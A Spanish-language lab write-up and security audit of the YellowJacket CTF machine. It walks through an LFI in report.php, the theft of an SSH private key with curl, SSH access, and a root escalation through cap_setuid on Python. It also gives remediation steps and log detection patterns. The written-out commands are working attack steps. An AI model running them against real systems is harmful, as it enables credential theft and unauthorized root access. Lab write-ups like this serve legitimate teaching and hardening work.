# YellowJacket — Auditoría de seguridad y writeup

| Campo | Valor |
|---|---|
| **Laboratorio** | YellowJacket — Whoami-Labs |
| **Dificultad** | Hard ★★★★★☆☆☆ |
| **MITRE ATT&CK** | T1548 — Abuse Elevation Control Mechanism |
| **NIST** | OM-ADM-001 (System Administrator) |
| **IP objetivo** | `172.17.0.2` |
| **Atacante** | Kali Linux 2026.3 |
| **Fecha** | 2026-11-15 |
| **Analista** | chifay |
| **Tipo de prueba** | Caja negra, sin credenciales iniciales |
| **Resultado** | Compromiso total: `vince` → `root` |
| **Flags** | usuario y root (ver [§14](#14-validación-y-flags)) |

> **TL;DR:** una inclusión de archivos locales (LFI) sin validación en `report.php` permite leer `/etc/passwd` y la clave privada SSH de `vince`, que además tenía permisos `644`. Con esa clave se accede por SSH al puerto `2222`; la enumeración local revela la capability `cap_setuid+ep` sobre `/usr/bin/python3.9`, que se abusa para obtener `uid=0` y leer `/root/flag.txt`.

---

## Contenido

1. [Resumen ejecutivo](#1-resumen-ejecutivo)
2. [Alcance y metodología](#2-alcance-y-metodología)
3. [Hallazgos](#3-hallazgos)
4. [Reconocimiento](#4-reconocimiento)
5. [Enumeración web](#5-enumeración-web)
6. [LFI en report.php](#6-lfi-en-reportphp)
7. [Robo de la clave privada SSH](#7-robo-de-la-clave-privada-ssh)
8. [Acceso inicial como vince](#8-acceso-inicial-como-vince)
9. [Enumeración local y capabilities](#9-enumeración-local-y-capabilities)
10. [Escalada a root y flag final](#10-escalada-a-root-y-flag-final)
11. [Impacto](#11-impacto)
12. [Remediación](#12-remediación)
13. [Detección y monitorización](#13-detección-y-monitorización)
14. [Validación y flags](#14-validación-y-flags)
15. [Anexos](#15-anexos)

---

## 1. Resumen ejecutivo

La aplicación web corporativa de Stinger Solutions expone un generador de informes (`/report.php`) que recibe la ruta de un archivo por parámetro y la entrega directamente a `readfile()` sin validación. Esto permite a un atacante no autenticado leer archivos arbitrarios del servidor con los privilegios de `www-data`.

La lectura de `/etc/passwd` reveló los usuarios `stinger` y `vince`. La clave privada SSH de `vince` (`/home/vince/.ssh/id_rsa`) tenía permisos `644`, por lo que fue legible a través del LFI. Con esa clave se obtuvo acceso SSH al servicio del puerto `2222`.

La enumeración local no encontró `sudo` ni binarios SUID anómalos, pero sí una **capability `cap_setuid+ep` asignada a `/usr/bin/python3.9`**. Cualquier usuario local puede ejecutar Python y llamar a `os.setuid(0)`, convirtiéndose en `root` sin necesidad de explotar un SUID. Finalmente se leyó `/root/flag.txt`.

Adicionalmente se identificó una **SQL injection latente** en `inventory.php` (concatenación directa en SQLite) y la base `inventory.db` era descargable a través del LFI; el endpoint devuelve `500` porque el módulo `SQLite3` de PHP no está cargado, lo que reduce su explotabilidad actual.

### Cadena de ataque

```text
Apache :80
  └── report.php?file= (LFI, lectura arbitraria como www-data)
        ├── /etc/passwd → usuarios stinger / vince
        └── /home/vince/.ssh/id_rsa (permisos 644)
              └── SSH :2222 como vince
                    └── /usr/bin/python3.9 con cap_setuid+ep
                          └── os.setuid(0) → root
                                └── /root/flag.txt
```

### Métricas de la cadena

| Métrica | Valor |
|---|---|
| Complejidad | Baja una vez descubierto el LFI |
| Autenticación requerida | Ninguna para el LFI |
| Interacción del usuario | Ninguna |
| Impacto | Confidencialidad, integridad y disponibilidad totales del host |
| Severidad global | **Crítica** (compromiso no autenticado de red a root) |

---

## 2. Alcance y metodología

### 2.1 Alcance

- Host `172.17.0.2` (contenedor `yellowjacket`).
- Servicios TCP expuestos: `80/tcp` (HTTP) y `2222/tcp` (SSH).
- Pruebas realizadas desde Kali Linux 2026.3 en la misma red de laboratorio.
- No se realizaron pruebas de denegación de servicio ni de fuerza bruta masiva.
- No se modificó la aplicación ni se dejaron mecanismos de persistencia.

### 2.2 Fases

1. Reconocimiento de puertos y servicios con Nmap.
2. Enumeración de contenido web con feroxbuster y cURL.
3. Identificación y explotación del LFI.
4. Enumeración de usuarios, claves y archivos sensibles.
5. Acceso inicial por SSH con la clave exfiltrada.
6. Enumeración local: sudo, SUID, capabilities, kernel y permisos.
7. Escalada de privilegios mediante `cap_setuid` en Python.
8. Captura de flags y documentación de evidencias.

### 2.3 Herramientas

| Herramienta | Uso |
|---|---|
| Nmap 7.991 | Descubrimiento de puertos y versiones |
| feroxbuster | Fuzzing de contenido web |
| cURL | Interacción manual con HTTP, LFI y descarga de archivos |
| OpenSSH | Acceso remoto con clave privada |
| Python 3.9 | Lectura de xattrs y abuso de `cap_setuid` |
| ssh-keygen | Validación e identificación de la clave |

### 2.4 Mapeo MITRE ATT&CK

| Técnica | ID | Uso en el laboratorio |
|---|---|---|
| Active Scanning | T1595 | Nmap sobre `172.17.0.2` |
| Gather Victim Host Information | T1592 | Detección de versiones de Apache/OpenSSH |
| Exploit Public-Facing Application | T1190 | LFI en `report.php` |
| File and Directory Discovery | T1083 | Lectura de `/etc/passwd` y rutas de usuario |
| Unsecured Credentials: Private Keys | T1552.004 | Clave `id_rsa` con permisos `644` |
| Valid Accounts | T1078 | Acceso SSH como `vince` |
| Abuse Elevation Control Mechanism | T1548 | `cap_setuid` en `/usr/bin/python3.9` |

> En las capturas de la terminal Kali, se difuminaron la clave privada, el fingerprint y el valor interno de las flags.

---

## 3. Hallazgos

| ID | Hallazgo | Severidad | CVSS 3.1 | CWE | Evidencia |
|---|---|---|---|---|---|
| **YJ-01** | Local File Inclusion en `/report.php?file=` | **Alta** | 7.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | CWE-22 / CWE-98 | [Captura 03](screenshots/03_lfi_passwd.png) |
| **YJ-02** | Clave privada SSH de `vince` con permisos `644` | **Alta** | 7.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | CWE-522 / CWE-732 | [Captura 04](screenshots/04_lfi_key.png) |
| **YJ-03** | `cap_setuid+ep` en `/usr/bin/python3.9` | **Alta** | 7.8 `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | CWE-269 / CWE-250 | [Captura 06](screenshots/06_capabilities.png), [07](screenshots/07_root_flag.png) |
| **YJ-04** | SQLi latente en `inventory.php` y `inventory.db` expuesta | **Media** | 5.3 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` | CWE-89 / CWE-200 | [Captura 02](screenshots/02_web_enum.png) |
| **YJ-05** | Divulgación de versiones de Apache/OpenSSH | **Baja** | 3.7 `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` | CWE-200 | [Captura 01](screenshots/01_nmap.png) |
| **YJ-06** | Contenedor desplegado con `--privileged` | **Media (plataforma)** | — | CWE-250 | `startlab.sh` |

### 3.1 YJ-01 — LFI en report.php

`report.php` acepta el parámetro `file` y ejecuta `readfile($file)` sin validar ruta, extensión ni esquema. Permite leer archivos del sistema y usar wrappers de PHP como `php://filter`.

- **Impacto:** lectura arbitraria de archivos como `www-data`, divulgación de configuración, usuarios, claves y código fuente.
- **Vector:** `GET /report.php?file=/etc/passwd`.
- **Causa raíz:** ausencia de allowlist y de comprobación de ruta canónica.

### 3.2 YJ-02 — Clave privada SSH expuesta

`/home/vince/.ssh/id_rsa` tenía modo `644` (`-rw-r--r--`), mientras que el directorio `.ssh` era `711`. El usuario `www-data` podía atravesar `.ssh` y leer la clave. La clave tenía 1823 bytes y era una RSA de 2048 bits.

- **Impacto:** suplantación de `vince` en SSH y acceso interactivo al host.
- **Causa raíz:** permisos incorrectos de la clave privada y ausencia de separación entre datos web y secretos de usuario.

### 3.3 YJ-03 — cap_setuid en el intérprete Python

`/usr/bin/python3.9` tenía el atributo extendido `security.capability` con valor `0100000280000000000000000000000000000000`, que corresponde a `cap_setuid` en los conjuntos *permitted* y *effective*. Cualquier usuario podía ejecutar:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

y obtener `uid=0`. Al ser una capability y no un SUID, la elevación es menos visible para controles que solo buscan el bit SUID.

- **Impacto:** escalada local a root para cualquier usuario del sistema.
- **Causa raíz:** capability excesiva asignada a un intérprete de propósito general.

### 3.4 YJ-04 — SQLi latente y base de datos expuesta

`inventory.php` concatena el parámetro `batch` directamente en una consulta SQLite:

```php
$res = $db->query("SELECT * FROM products WHERE batch_id = '$batch'");
```

La base `inventory.db` es legible (`644`) y contiene la tabla `products` con datos de inventario. El endpoint devuelve `500` porque el módulo `SQLite3` de PHP no está cargado (`class_exists("SQLite3") === false`), por lo que la inyección no es explotable en el estado actual. Aun así, el código es vulnerable por diseño y la base se puede descargar vía LFI.

### 3.5 YJ-05 — Divulgación de versiones

Nmap identifica Apache `2.4.66` y OpenSSH `8.4p1 Debian 5+deb11u5`. La divulgación facilita la búsqueda de vulnerabilidades conocidas y no aporta valor al negocio.

### 3.6 YJ-06 — Contenedor privilegiado (observación de despliegue)

El script de laboratorio lanza el contenedor con `--privileged`. Aunque no fue necesario para comprometer la máquina, un contenedor privilegiado amplía el impacto de una intrusión: un escape podría afectar al host. Se recomienda eliminar `--privileged` y aplicar `--cap-drop=ALL`, `--no-new-privileges`, seccomp/AppArmor y sistemas de archivos de solo lectura cuando sea posible.

---

## 4. Reconocimiento

### 4.1 Escaneo de puertos

```bash
nmap -Pn -p- --min-rate 3000 -T4 172.17.0.2 -oN evidence/01_nmap_allports.txt
nmap -Pn -p 80,2222 -sV 172.17.0.2 -oN evidence/01_nmap_services.txt
```

Resultado:

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
MAC Address: C6:A1:4E:41:02:97 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo dos servicios expuestos. El puerto `2222` es SSH en un puerto no estándar; el cambio de puerto no es un control de seguridad, pero reduce el ruido de escaneos automatizados.

![Reconocimiento Nmap](screenshots/01_nmap.png)

*Captura 01 — Descubrimiento de puertos y detección de versiones.*

### 4.2 Sistema operativo

Tras el acceso inicial se confirmó:

```text
Debian GNU/Linux 11 (bullseye)
Linux yellowjacket 7.2.15+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.2.15-1kali1 (2026-11-03) x86_64 GNU/Linux
```

---

## 5. Enumeración web

### 5.1 Página principal

`http://172.17.0.2/` sirve una página estática de "Stinger Solutions" con un mensaje de estado que indica que la sesión es `GUEST`. No hay formularios, enlaces ni recursos relevantes.

### 5.2 Fuzzing de contenido

```bash
feroxbuster -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -x php,html,txt -q -t 50 --no-state
```

Hallazgos:

```text
200      GET        1l        3w       17c http://172.17.0.2/report.php
500      GET        0l        0w        0c http://172.17.0.2/inventory.php
```

`report.php` responde `200` con el texto `No file specified`, lo que sugiere un parámetro `file`. `inventory.php` devuelve `500`.

![Enumeración web](screenshots/02_web_enum.png)

*Captura 02 — feroxbuster descubre `report.php` e `inventory.php`; `report.php` pide un archivo.*

### 5.3 Prueba de parámetros

```bash
curl -sS http://172.17.0.2/report.php
# No file specified

curl -sS 'http://172.17.0.2/report.php?file=/etc/passwd'
# root:x:0:0:root:/root:/bin/bash ...
```

El parámetro `file` es el vector del LFI.

---

## 6. LFI en report.php

### 6.1 Lectura de /etc/passwd

```bash
curl -sS "http://172.17.0.2/report.php?file=/etc/passwd"
```

Salida relevante:

```text
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
stinger:x:1000:1000::/home/stinger:/bin/bash
vince:x:1001:1001::/home/vince:/bin/bash
```

Dos usuarios interactivos: `stinger` y `vince`.

### 6.2 Código fuente vulnerable

El wrapper `php://filter` permite obtener el código fuente en base64:

```bash
curl -sS 'http://172.17.0.2/report.php?file=php://filter/convert.base64-encode/resource=report.php' | base64 -d
```

Resultado:

```php
<?php $file = $_GET['file']; if(isset($file)){ readfile($file); } else { echo 'No file specified'; } ?>
```

No hay allowlist, normalización de ruta ni comprobación de que el archivo esté dentro de un directorio permitido. `readfile()` entrega el contenido tal cual, incluyendo archivos binarios.

![LFI y código fuente](screenshots/03_lfi_passwd.png)

*Captura 03 — `/etc/passwd` a través del LFI y código fuente de `report.php`.*

### 6.3 Alcance del LFI

Con `www-data` se puede leer:

- Configuración del sistema (`/etc/passwd`, `/etc/ssh/sshd_config`, etc.).
- Código y datos de la aplicación (`/var/www/html/*`).
- Claves y archivos de usuarios si los permisos lo permiten.
- Bases de datos y archivos de respaldo.

---

## 7. Robo de la clave privada SSH

### 7.1 Búsqueda en directorios de usuario

Se probaron rutas habituales de claves SSH:

```bash
curl -sS "http://172.17.0.2/report.php?file=/home/vince/.ssh/id_rsa" -o evidence/vince_id_rsa
```

La respuesta tuvo 1823 bytes y comenzó con `-----BEGIN OPENSSH PRIVATE KEY-----`. La clave de `stinger` no existía o no era legible; su home solo contenía los archivos por defecto de Debian.

### 7.2 Permisos que hicieron posible el robo

```bash
ls -la /home/vince/.ssh
stat -c "%a %U:%G %n" /home/vince /home/vince/.ssh /home/vince/.ssh/id_rsa
namei -l /home/vince/.ssh/id_rsa
```

Resultado:

```text
-rw------- 1 vince vince  399 Apr  5  2026 authorized_keys
-rw-r--r-- 1 vince vince 1823 Apr  5  2026 id_rsa
-rw-r--r-- 1 vince vince  399 Apr  5  2026 id_rsa.pub

755 vince:vince /home/vince
711 vince:vince /home/vince/.ssh
644 vince:vince /home/vince/.ssh/id_rsa
```

La clave privada era **legible por cualquier usuario** (`644`). El directorio `.ssh` permitía atravesarlo (`711`), por lo que `www-data` pudo leerla a través del LFI.

### 7.3 Validación de la clave

```bash
chmod 600 evidence/vince_id_rsa
ssh-keygen -lf evidence/vince_id_rsa
```

```text
2048 SHA256:[FINGERPRINT OMITIDO EN LA VERSIÓN PÚBLICA]
```

![Exfiltración de la clave SSH](screenshots/04_lfi_key.png)

*Captura 04 — Descarga de `id_rsa`, permisos y fingerprint de la clave.*

---

## 8. Acceso inicial como vince

### 8.1 Conexión SSH

```bash
ssh -i evidence/vince_id_rsa -p 2222 \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  vince@172.17.0.2
```

La autenticación por clave funciona sin contraseña. El host se identifica como `yellowjacket`.

### 8.2 Enumeración básica

```bash
id
hostname
uname -r
ls -la
cat ~/user.txt
```

Resultado:

```text
uid=1001(vince) gid=1001(vince) groups=1001(vince)
yellowjacket
7.2.15+kali-amd64
...
-r-------- 1 vince vince 37 Apr  5  2026 user.txt

Whoami{REDACTADO}
```

Ya se tiene la primera flag (`user.txt`), pero el objetivo del laboratorio es la flag de root.

![Acceso SSH como vince](screenshots/05_ssh_vince.png)

*Captura 05 — Acceso SSH con la clave exfiltrada y lectura de `user.txt`.*

---

## 9. Enumeración local y capabilities

### 9.1 Sudo y SUID

```bash
command -v sudo || echo "sudo no instalado"
find / -perm -4000 -type f 2>/dev/null
```

`sudo` no está instalado. Los SUID encontrados son los estándar de Debian:

```text
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/bin/su
/bin/umount
/bin/mount
```

Ninguno es explotable directamente en esta configuración.

### 9.2 getcap no disponible

`getcap` no está instalado en la imagen. Para no depender de él, se lee directamente el atributo extendido:

```bash
python3 -c 'import os; print(os.getxattr("/usr/bin/python3.9","security.capability").hex())'
```

```text
0100000280000000000000000000000000000000
```

El valor `0x80` en el campo *permitted* corresponde al bit 7: **CAP_SETUID**. La cabecera `01000002` indica revisión 2 con el flag *effective*.

### 9.3 Prueba de elevación

```bash
python3 -c 'import os; os.setuid(0); print("uid =", os.getuid())'
```

```text
uid = 0
```

La capability está presente en `/usr/bin/python3.9`; `/usr/bin/python3` es un enlace al mismo binario, por lo que ambos permiten la elevación. Perl y PHP no mostraron la capability.

![Enumeración de capabilities](screenshots/06_capabilities.png)

*Captura 06 — Lectura del xattr `security.capability` y prueba de `setuid(0)` con Python.*

---

## 10. Escalada a root y flag final

```bash
CMD='import os; os.setuid(0); os.system("id; hostname; ls -l /root/flag.txt; echo; cat /root/flag.txt")'
ssh -i evidence/vince_id_rsa -p 2222 \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  vince@172.17.0.2 "python3 -c '$CMD'"
```

Resultado:

```text
uid=0(root) gid=1001(vince) groups=1001(vince)
yellowjacket
-r-------- 1 root root 34 Apr  5  2026 /root/flag.txt

Whoami{REDACTADO}
```

El `gid` sigue siendo `1001` porque solo se cambió el UID, pero `uid=0` es suficiente para leer `/root/flag.txt` y operar como root. Para una shell completa:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

![Escalada a root y flag](screenshots/07_root_flag.png)

*Captura 07 — `uid=0`, permisos de la flag y lectura de `/root/flag.txt`.*

---

## 11. Impacto

### 11.1 Confidencialidad

- Lectura de cualquier archivo accesible por `www-data`, incluidos código fuente, configuración y claves.
- Exfiltración de la clave privada de `vince`.
- Acceso a `inventory.db` y datos de inventario.
- Acceso final a `/root/flag.txt` y a cualquier secreto del sistema.

### 11.2 Integridad y disponibilidad

Con `uid=0` un atacante puede modificar binarios, configuración, tareas programadas, claves autorizadas y datos; también puede borrar o cifrar información. En un entorno real, el compromiso de root permite persistencia, movimiento lateral y uso del host como punto de apoyo.

### 11.3 Plataforma

El contenedor se ejecuta con `--privileged`. Si un atacante logra un escape de contenedor, el impacto se extiende al host. Aunque no fue necesario para resolver el laboratorio, es un riesgo de despliegue que debe corregirse.

### 11.4 Evaluación de riesgo

| Dimensión | Valoración |
|---|---|
| Probabilidad | Alta: LFI no autenticado y clave legible |
| Impacto | Alto: root en el host |
| Riesgo global | **Crítico** |
| Detección | Baja: no se usaron exploits ruidosos ni fuerza bruta |

---

## 12. Remediación

### 12.1 Prioridad alta

#### 1. Eliminar el LFI de `report.php`

No pasar entrada del usuario a `readfile()`. Usar un identificador de informe y un mapa de rutas permitidas:

```php
<?php
$reports = [
    'inventory' => '/var/www/reports/inventory.php',
    'safety'    => '/var/www/reports/safety.php',
];

$key = $_GET['report'] ?? '';
if (!isset($reports[$key])) {
    http_response_code(400);
    exit('Informe no válido');
}

readfile($reports[$key]);
```

Complementos:

- Validar con `realpath()` que la ruta resuelta esté dentro del directorio permitido.
- Configurar `open_basedir` para limitar PHP al webroot y al directorio de informes:
  ```apache
  php_admin_value open_basedir /var/www/html:/var/www/reports
  ```
- Deshabilitar wrappers innecesarios y revisar `allow_url_include`/`allow_url_fopen`.
- Ejecutar la aplicación con un usuario dedicado y permisos mínimos.

#### 2. Corregir los permisos de la clave SSH y rotarla

```bash
chmod 700 /home/vince/.ssh
chmod 600 /home/vince/.ssh/id_rsa /home/vince/.ssh/authorized_keys
```

- Rotar la clave expuesta y eliminar la entrada antigua de `authorized_keys`.
- No almacenar claves privadas en directorios legibles por el servidor web.
- Preferir claves por usuario con passphrase, `ssh-agent` o certificados SSH de corta duración.
- Auditar todos los homes:
  ```bash
  find /home -name id_rsa -o -name id_ed25519 -o -name '*.pem' -exec ls -l {} \;
  ```

#### 3. Eliminar la capability de Python

```bash
# Con libcap2-bin instalado
setcap -r /usr/bin/python3.9

# Alternativa con attr
setfattr -x security.capability /usr/bin/python3.9

# Verificación
getcap -r / 2>/dev/null
```

- No asignar `cap_setuid` a intérpretes de propósito general.
- Si se necesita una funcionalidad concreta, crear un wrapper mínimo, revisado, con la capability justa y auditoría.
- Auditar periódicamente las capabilities:
  ```bash
  find / -xdev -type f -exec getcap {} \; 2>/dev/null
  ```

### 12.2 Prioridad media

#### 4. Corregir `inventory.php` y proteger la base de datos

- Usar consultas preparadas:
  ```php
  $stmt = $db->prepare('SELECT * FROM products WHERE batch_id = :batch');
  $stmt->bindValue(':batch', $_GET['batch'], SQLITE3_TEXT);
  $res = $stmt->execute();
  ```
- Validar y limitar el parámetro `batch`.
- Mover `inventory.db` fuera del webroot o protegerla con permisos y autenticación.
- Instalar/activar el módulo `SQLite3` si la funcionalidad es necesaria, o retirar el endpoint si no lo es.

#### 5. Endurecer SSH

- Solo autenticación por clave (sin contraseñas).
- `AllowUsers vince` o grupos concretos.
- Restringir el origen con firewall o `Match Address`.
- `PermitRootLogin no`.
- Fail2ban/rate limiting y alertas de inicio de sesión.
- El puerto no estándar no sustituye a los controles anteriores.

#### 6. Reducir la divulgación de versiones

```apache
ServerTokens Prod
ServerSignature Off
```

Mantener Apache, OpenSSH y PHP actualizados.

### 12.3 Prioridad baja / plataforma

#### 7. Endurecer el contenedor

- Eliminar `--privileged`.
- Usar `--cap-drop=ALL` y añadir solo las capabilities necesarias.
- `--security-opt=no-new-privileges`.
- Perfiles seccomp y AppArmor/SELinux.
- Sistema de archivos de solo lectura y volúmenes mínimos.
- Límites de recursos y aislamiento de red.

---

## 13. Detección y monitorización

### 13.1 LFI en logs de Apache

Patrones sospechosos en `access.log`:

```bash
grep -E 'report\.php\?file=.*(\.\./|/etc/|\.ssh/|php://|%2e%2e)' /var/log/apache2/access.log
```

Alertar sobre:

- Rutas absolutas (`/etc/passwd`, `/home/*/.ssh/*`).
- Wrappers (`php://filter`, `php://input`).
- Secuencias de traversal (`../`, `%2e%2e`).
- Respuestas `200` de `report.php` con tamaños anómalos.

### 13.2 Cambios de capabilities

- Monitorizar `setxattr`/`removexattr` sobre binarios del sistema.
- Alertar si aparece `security.capability` en intérpretes (`python*`, `perl`, `ruby`, `node`, `php`).
- Comparar inventario de capabilities con una línea base.

### 13.3 Accesos SSH

- Alertar de inicios de sesión de `vince` desde IPs no habituales.
- Revisar `auth.log` y `lastlog`.
- Correlacionar descargas web de `.ssh/id_rsa` con conexiones SSH posteriores.

### 13.4 Integridad de archivos

- FIM sobre `/var/www/html`, `/home/*/.ssh`, `/usr/bin/python*`, `/etc/ssh`.
- Alertas por cambios de permisos en claves privadas.

---

## 14. Validación y flags

### 14.1 Flags obtenidas

| Flag | Ruta | Valor |
|---|---|---|
| Usuario | `/home/vince/user.txt` | `Whoami{REDACTADO}` |
| Root (final) | `/root/flag.txt` | `Whoami{REDACTADO}` |

### 14.2 Validación en el laboratorio

El script `startlab.sh` compara la flag introducida con la flag canónica de `/root/flag.txt` dentro del contenedor. Para registrar el solve:

```bash
./startlab.sh yellowjacket.tar
# Introducir: Whoami{REDACTADO}
```

Si el laboratorio ya está desplegado y la sesión está activa, no es necesario relanzarlo; la flag final es la de root.

---

## 15. Anexos

### Anexo A — Nota sobre las capturas

Las capturas se tomaron de la terminal kali, mostrando los comandos ejecutados, en ésta versión pública se difumino la información sensible.

### Anexo B — Evidencias

Las evidencias crudas (salidas completas, base SQLite y clave privada) se conservaron en el entorno de laboratorio y **no se publican**. Las capturas de `screenshots/` son el registro visual de la auditoría; los valores sensibles fueron difuminados.

> La clave privada y su fingerprint no forman parte de este repositorio.

### Anexo C — Cronología

| Pasos | Acción |
|---|---|
| 1 | Escaneo completo de puertos y detección de servicios |
| 2 | Enumeración web; descubrimiento de `report.php` e `inventory.php` |
| 3 | Confirmación de LFI; lectura de `/etc/passwd` y código fuente |
| 4 | Exfiltración de `/home/vince/.ssh/id_rsa` |
| 5 | Acceso SSH como `vince`; lectura de `user.txt` |
| 6 | Enumeración local; detección de `cap_setuid` en Python |
| 7 | Elevación a root; lectura de `/root/flag.txt` |
| 8 | Generación de capturas y evidencias para el writeup |

### Anexo D — Notas de manejo de evidencias

- La clave privada no se incluye en este repositorio; se conservó con modo `600` en el entorno de laboratorio.
- El fingerprint de la clave se omite en la versión pública.
- Las capturas son de un entorno efímero de laboratorio; no deben reutilizarse en sistemas reales sin autorización.
- Para reproducir el laboratorio, usar el despliegue original de Whoami-Labs.

---

## Conclusión

YellowJacket demuestra cómo una vulnerabilidad de lectura de archivos aparentemente limitada puede encadenarse con malas prácticas de permisos y una capability excesiva hasta comprometer completamente el host. La lección clave es que el LFI no solo expone configuración: también puede exponer credenciales. Y que las capabilities de Linux, al igual que los SUID, deben auditarse y eliminarse de intérpretes de propósito general.

**La corrección prioritaria es doble:** cerrar el LFI en `report.php` y eliminar `cap_setuid` de `/usr/bin/python3.9`. Cualquiera de las dos medidas por sí sola ya rompe la cadena de compromiso total; ambas juntas restauran una postura razonable para el laboratorio.
